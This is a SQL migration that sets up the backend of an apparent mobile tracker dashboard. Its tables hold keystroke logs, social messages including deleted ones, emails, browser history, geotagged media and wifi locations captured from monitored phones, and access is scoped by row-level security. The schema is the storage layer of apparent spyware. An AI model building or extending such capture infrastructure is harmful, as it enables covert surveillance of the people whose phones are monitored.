-- =========================================================================
-- MIGRATION 002: EXTENDED TABLES FOR MOBILE TRACKER DASHBOARD
-- =========================================================================

-- 7. Create installed_apps table
CREATE TABLE IF NOT EXISTS public.installed_apps (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
  app_name TEXT NOT NULL,
  package_name TEXT NOT NULL,
  version_name TEXT,
  version_code INTEGER,
  app_icon_url TEXT,
  is_system_app BOOLEAN DEFAULT false,
  installed_at TIMESTAMPTZ,
  last_used TIMESTAMPTZ,
  usage_time_today INTEGER DEFAULT 0,
  data_usage_mobile BIGINT DEFAULT 0,
  data_usage_wifi BIGINT DEFAULT 0,
  is_blocked BOOLEAN DEFAULT false,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 8. Create app_usage table
CREATE TABLE IF NOT EXISTS public.app_usage (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
  package_name TEXT NOT NULL,
  app_name TEXT,
  start_time TIMESTAMPTZ NOT NULL,
  end_time TIMESTAMPTZ,
  duration INTEGER DEFAULT 0,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 9. Create media_files table
CREATE TABLE IF NOT EXISTS public.media_files (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
  file_type TEXT NOT NULL CHECK (file_type IN ('photo','video','audio','document')),
  file_name TEXT,
  file_url TEXT NOT NULL,
  thumbnail_url TEXT,
  file_size BIGINT,
  mime_type TEXT,
  width INTEGER,
  height INTEGER,
  duration INTEGER,
  latitude DOUBLE PRECISION,
  longitude DOUBLE PRECISION,
  source TEXT,
  is_deleted BOOLEAN DEFAULT false,
  file_timestamp TIMESTAMPTZ,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 10. Create social_messages table
CREATE TABLE IF NOT EXISTS public.social_messages (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
  platform TEXT NOT NULL,
  message_type TEXT DEFAULT 'text' CHECK (message_type IN ('text','image','video','audio','document','sticker','gif','location','contact','call_log')),
  direction TEXT CHECK (direction IN ('incoming','outgoing')),
  sender_name TEXT,
  sender_id TEXT,
  receiver_name TEXT,
  receiver_id TEXT,
  group_name TEXT,
  group_id TEXT,
  body TEXT,
  media_url TEXT,
  media_thumbnail_url TEXT,
  is_deleted BOOLEAN DEFAULT false,
  timestamp TIMESTAMPTZ NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 11. Create browser_history table
CREATE TABLE IF NOT EXISTS public.browser_history (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
  url TEXT NOT NULL,
  title TEXT,
  visit_count INTEGER DEFAULT 1,
  browser_name TEXT,
  favicon_url TEXT,
  is_bookmarked BOOLEAN DEFAULT false,
  timestamp TIMESTAMPTZ NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 12. Create browser_bookmarks table
CREATE TABLE IF NOT EXISTS public.browser_bookmarks (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
  url TEXT NOT NULL,
  title TEXT,
  browser_name TEXT,
  folder TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 13. Create keylog_entries table
CREATE TABLE IF NOT EXISTS public.keylog_entries (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
  app_name TEXT,
  package_name TEXT,
  text_content TEXT NOT NULL,
  timestamp TIMESTAMPTZ NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 14. Create calendar_events table
CREATE TABLE IF NOT EXISTS public.calendar_events (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
  title TEXT,
  description TEXT,
  location TEXT,
  start_time TIMESTAMPTZ,
  end_time TIMESTAMPTZ,
  all_day BOOLEAN DEFAULT false,
  calendar_name TEXT,
  organizer TEXT,
  attendees JSONB,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 15. Create emails table
CREATE TABLE IF NOT EXISTS public.emails (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
  email_type TEXT CHECK (email_type IN ('incoming','outgoing','draft')),
  from_address TEXT,
  from_name TEXT,
  to_addresses JSONB,
  cc_addresses JSONB,
  bcc_addresses JSONB,
  subject TEXT,
  body_preview TEXT,
  body_html TEXT,
  has_attachments BOOLEAN DEFAULT false,
  attachments JSONB,
  folder TEXT,
  is_read BOOLEAN DEFAULT false,
  timestamp TIMESTAMPTZ NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- 16. Create wifi_networks table
CREATE TABLE IF NOT EXISTS public.wifi_networks (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  device_id UUID REFERENCES public.devices(id) ON DELETE CASCADE NOT NULL,
  ssid TEXT NOT NULL,
  bssid TEXT,
  security_type TEXT,
  signal_strength INTEGER,
  frequency INTEGER,
  is_connected BOOLEAN DEFAULT false,
  ip_address TEXT,
  latitude DOUBLE PRECISION,
  longitude DOUBLE PRECISION,
  timestamp TIMESTAMPTZ NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW()
);


-- =========================================================================
-- CREATE INDEXES
-- =========================================================================
CREATE INDEX IF NOT EXISTS idx_social_device_platform ON public.social_messages(device_id, platform, timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_browser_device_timestamp ON public.browser_history(device_id, timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_keylog_device_timestamp ON public.keylog_entries(device_id, timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_media_device_type ON public.media_files(device_id, file_type, created_at DESC);
CREATE INDEX IF NOT EXISTS idx_apps_device ON public.installed_apps(device_id);
CREATE INDEX IF NOT EXISTS idx_app_usage_device ON public.app_usage(device_id, start_time DESC);
CREATE INDEX IF NOT EXISTS idx_emails_device ON public.emails(device_id, timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_wifi_device ON public.wifi_networks(device_id, timestamp DESC);
CREATE INDEX IF NOT EXISTS idx_calendar_device ON public.calendar_events(device_id);
CREATE INDEX IF NOT EXISTS idx_bookmarks_device ON public.browser_bookmarks(device_id);


-- =========================================================================
-- ENABLE ROW LEVEL SECURITY (RLS)
-- =========================================================================
ALTER TABLE public.installed_apps ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.app_usage ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.media_files ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.social_messages ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.browser_history ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.browser_bookmarks ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.keylog_entries ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.calendar_events ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.emails ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.wifi_networks ENABLE ROW LEVEL SECURITY;


-- =========================================================================
-- RLS POLICIES FOR ALL NEW TABLES
-- =========================================================================

-- installed_apps
CREATE POLICY "Users access own apps" ON public.installed_apps FOR ALL TO authenticated 
USING (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid())) WITH CHECK (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid()));
CREATE POLICY "Service role full access apps" ON public.installed_apps FOR ALL TO service_role USING (true) WITH CHECK (true);

-- app_usage
CREATE POLICY "Users access own app_usage" ON public.app_usage FOR ALL TO authenticated 
USING (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid())) WITH CHECK (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid()));
CREATE POLICY "Service role full access app_usage" ON public.app_usage FOR ALL TO service_role USING (true) WITH CHECK (true);

-- media_files
CREATE POLICY "Users access own media" ON public.media_files FOR ALL TO authenticated 
USING (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid())) WITH CHECK (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid()));
CREATE POLICY "Service role full access media" ON public.media_files FOR ALL TO service_role USING (true) WITH CHECK (true);

-- social_messages
CREATE POLICY "Users access own social_messages" ON public.social_messages FOR ALL TO authenticated 
USING (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid())) WITH CHECK (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid()));
CREATE POLICY "Service role full access social_messages" ON public.social_messages FOR ALL TO service_role USING (true) WITH CHECK (true);

-- browser_history
CREATE POLICY "Users access own browser_history" ON public.browser_history FOR ALL TO authenticated 
USING (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid())) WITH CHECK (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid()));
CREATE POLICY "Service role full access browser_history" ON public.browser_history FOR ALL TO service_role USING (true) WITH CHECK (true);

-- browser_bookmarks
CREATE POLICY "Users access own bookmarks" ON public.browser_bookmarks FOR ALL TO authenticated 
USING (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid())) WITH CHECK (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid()));
CREATE POLICY "Service role full access bookmarks" ON public.browser_bookmarks FOR ALL TO service_role USING (true) WITH CHECK (true);

-- keylog_entries
CREATE POLICY "Users access own keylogs" ON public.keylog_entries FOR ALL TO authenticated 
USING (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid())) WITH CHECK (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid()));
CREATE POLICY "Service role full access keylogs" ON public.keylog_entries FOR ALL TO service_role USING (true) WITH CHECK (true);

-- calendar_events
CREATE POLICY "Users access own calendar" ON public.calendar_events FOR ALL TO authenticated 
USING (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid())) WITH CHECK (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid()));
CREATE POLICY "Service role full access calendar" ON public.calendar_events FOR ALL TO service_role USING (true) WITH CHECK (true);

-- emails
CREATE POLICY "Users access own emails" ON public.emails FOR ALL TO authenticated 
USING (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid())) WITH CHECK (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid()));
CREATE POLICY "Service role full access emails" ON public.emails FOR ALL TO service_role USING (true) WITH CHECK (true);

-- wifi_networks
CREATE POLICY "Users access own wifi" ON public.wifi_networks FOR ALL TO authenticated 
USING (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid())) WITH CHECK (device_id IN (SELECT id FROM public.devices WHERE user_id = auth.uid()));
CREATE POLICY "Service role full access wifi" ON public.wifi_networks FOR ALL TO service_role USING (true) WITH CHECK (true);
